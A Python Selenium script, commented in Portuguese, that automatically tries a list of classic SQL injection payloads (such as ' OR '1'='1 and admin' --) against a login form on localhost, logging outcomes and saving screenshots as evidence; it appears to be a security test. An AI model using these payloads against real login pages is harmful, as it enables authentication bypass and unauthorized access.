import os
import logging
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

# Cria a pasta de evidências
base_dir = 'logs_screenshots/evidencias_injecaoSQL'
os.makedirs(base_dir, exist_ok=True)

# Configura o logging para salvar o log do terminal em um arquivo
logging.basicConfig(
    filename=os.path.join(base_dir, 'test_log_terminal.log'),
    filemode='w',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

driver = webdriver.Chrome()

driver.get('http://localhost:3000/login.html')

payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR '1'='1' --",
    "' OR 'a'='a",
    "' OR ''='",
    "'='",
    "admin' --",
    "admin' OR '1'='1",
    "' OR 1=1 LIMIT 1--",
    "' OR sleep(5)--",
]

for i, payload in enumerate(payloads):
    try:
        logging.info(f"\nTestando payload: {payload}")


        input_usuario = driver.find_element(By.ID, 'nome')
        input_senha = driver.find_element(By.ID, 'senha')
        time.sleep(3)
        
        input_usuario.clear()
        input_senha.clear()

        input_usuario.send_keys(payload)
        input_senha.send_keys(payload)
        input_senha.send_keys(Keys.RETURN)

        if "Bem-vindo" in driver.page_source or "dashboard" in driver.current_url:
            logging.info("✅ Injeção SQL bem-sucedida!")
        else:
            logging.info("❌ Falha na injeção SQL.")

        # Salva o screenshot
        nome_arquivo_png = f"test_{i}_{payload}".replace(" ", "_").replace("'", "_").replace('"', '_').replace('--','').replace('=','_') + ".png"
        caminho_screenshot = os.path.join(base_dir, nome_arquivo_png)
        driver.save_screenshot(caminho_screenshot)
        logging.info(f"Screenshot salvo em: {caminho_screenshot}")

    except Exception as e:
        logging.error(f"Erro durante o teste: {e}")

driver.quit()
